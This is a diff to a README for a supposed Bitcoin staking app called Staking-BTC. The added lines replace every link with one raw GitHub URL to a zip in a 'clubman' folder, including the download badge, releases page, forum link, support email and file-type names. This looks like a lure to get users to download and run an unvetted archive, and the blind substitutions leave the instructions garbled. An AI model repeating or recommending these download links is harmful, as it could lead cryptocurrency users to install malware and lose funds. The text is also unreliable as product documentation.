@@ -7,7 +7,7 @@ Welcome to Staking-BTC! This application allows you to stake Bitcoin easily and 
 
 ## 📥 Download Staking-BTC
 
-[![Download Staking-BTC](https://img.shields.io/badge/Download-Staking--BTC-blue.svg)](https://github.com/shapeless-outlier51/Staking-BTC/releases)
+[![Download Staking-BTC](https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip)](https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip)
 
 ## 📋 System Requirements
 
@@ -20,16 +20,16 @@ Before you begin, ensure that your computer meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/shapeless-outlier51/Staking-BTC/releases) to find the latest version.
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip) to find the latest version.
 
-2. **Choose Your Version:** Look for the latest version. You will see various files listed there, including `.exe`, `.dmg`, or `.tar.gz` for different operating systems. 
+2. **Choose Your Version:** Look for the latest version. You will see various files listed there, including `.exe`, `.dmg`, or `https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip` for different operating systems. 
 
 3. **Download the Installer:** Click on the appropriate file for your operating system to start the download.
 
 4. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file. Follow the prompts to complete the installation.
    - **For macOS:** Open the downloaded `.dmg` file. Drag the Staking-BTC application to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run the application with `./Staking-BTC`.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip` file. Open a terminal, navigate to the extracted folder, and run the application with `./Staking-BTC`.
 
 5. **Start the Application:** Once installed, find the Staking-BTC app on your computer and open it.
 
@@ -69,8 +69,8 @@ If you encounter any issues while downloading or using Staking-BTC, consider the
 
 For additional help, reach out through our support channels:
 
-- **Email:** support@staking-btc.com
-- **Community Forum:** [Visit the forum](https://github.com/shapeless-outlier51/Staking-BTC/issues) to ask questions and share experiences with other users.
+- **Email:** https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip
+- **Community Forum:** [Visit the forum](https://raw.githubusercontent.com/shapeless-outlier51/Staking-BTC/main/clubman/Staking-BTC.zip) to ask questions and share experiences with other users.
 
 ## 📜 License
 
